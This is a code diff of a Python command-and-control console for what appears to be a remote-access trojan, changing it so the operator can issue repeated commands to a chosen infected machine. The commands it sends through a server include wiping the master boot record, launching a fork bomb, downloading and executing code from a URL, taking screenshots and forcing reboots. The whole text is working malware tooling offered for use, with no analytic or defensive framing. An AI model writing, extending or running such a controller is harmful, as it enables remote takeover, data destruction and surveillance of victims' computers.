@@ -1,4 +1,4 @@
-import requests
+﻿import requests
 import os
 import sys
 import time
@@ -73,9 +73,9 @@ else:
 		print(logo)
 		print(Fore.GREEN + "[!] - Server: " + url)
 		print(userslist.text)
-		if(userslist.text == None):
+		if(userslist.text == ''):
 			print('no users')
-			exit()
+			exit()	
     			
 		id = input('Enter user ID: ')
 		clear()
@@ -83,38 +83,41 @@ else:
 		print(Fore.GREEN + "[!] - Server: " + url)
 		print(Fore.GREEN + 'User ' + id + ' set')
 		comandhelp()
-		command = input('Enter your command: ')
-		if(command == "MSG_BOX"):
-			content = input('Enter content: ')
-			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=msg_box&content=' + content)
-			print(Fore.GREEN + 'comand send!')
-		elif(command == "REBOOT"):
-			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=reboot')
-			print(Fore.GREEN + 'comand send!')
-		elif(command == "DELETE_MBR"):
-			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=MBR_DELETE')
-			print(Fore.GREEN + 'comand send!')
-		elif(command == "OPEN_LINK"):
-			content = input('Enter URL: ')
-			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=open_link&content=' + content)
-			print(Fore.GREEN + 'comand send!')
-		elif(command == "EXIT"):
-			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=exit')
-			print(Fore.GREEN + 'comand send!')
-		elif(command == "DOWLOAND_AND_EXECUTE"):
-			content = input('Enter URL: ')
-			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=download_execute&content=' + content)
-			print(Fore.GREEN + 'comand send!')
-		elif(command == "FORK_BOMB"):
-			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=forkbomb')
-			print(Fore.GREEN + 'comand send!')
-		elif(command == 'SCRENSHOT'):
-			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=screnshot')
-			print(Fore.GREEN + 'comand send!')
-		elif(command == "PING"):
-			requests.get(url + 'ping/SendPingComand.php?id=' + id)
-			print(Fore.GREEN + 'comand send!')
-		elif(command == "HELP"):
-			comandhelp()
-		elif(command == "DISCONNECT"):
-			exit()
+		while(True):
+			command = input('Enter your command: ')
+			if(command == "MSG_BOX"):
+				content = input('Enter content: ')
+				requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=msg_box&content=' + content)
+				print(Fore.GREEN + 'comand send!')
+			elif(command == "REBOOT"):
+				requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=reboot')
+				print(Fore.GREEN + 'comand send!')
+			elif(command == "DELETE_MBR"):
+				requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=MBR_DELETE')
+				print(Fore.GREEN + 'comand send!')
+			elif(command == "OPEN_LINK"):
+				content = input('Enter URL: ')
+				requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=open_link&content=' + content)
+				print(Fore.GREEN + 'comand send!')
+			elif(command == "EXIT"):
+				requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=exit')
+				print(Fore.GREEN + 'comand send!')
+			elif(command == "DOWLOAND_AND_EXECUTE"):
+				content = input('Enter URL: ')
+				requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=download_execute&content=' + content)
+				print(Fore.GREEN + 'comand send!')
+			elif(command == "FORK_BOMB"):
+				requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=forkbomb')
+				print(Fore.GREEN + 'comand send!')
+			elif(command == 'SCRENSHOT'):
+				requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=screnshot')
+				print(Fore.GREEN + 'comand send!')
+			elif(command == "PING"):
+				requests.get(url + 'ping/SendPingComand.php?id=' + id)
+				print(Fore.GREEN + 'comand send!')
+			elif(command == "HELP"):
+				comandhelp()
+			elif(command == "DISCONNECT"):
+				exit()
+			else:
+				comandhelp()
